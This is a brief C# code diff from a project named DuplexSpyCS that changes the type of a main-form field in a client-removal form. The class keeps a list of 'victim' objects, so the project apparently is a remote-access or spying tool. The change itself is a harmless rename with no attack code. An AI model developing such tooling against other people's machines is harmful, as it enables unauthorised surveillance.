@@ -14,7 +14,7 @@ namespace DuplexSpyCS
     public partial class frmClntRemove : Form
     {
         public List<clsVictim> m_lsVictim;
-        public Form1 frmMain;
+        public frmMain frmMain;
 
         public frmClntRemove()
         {
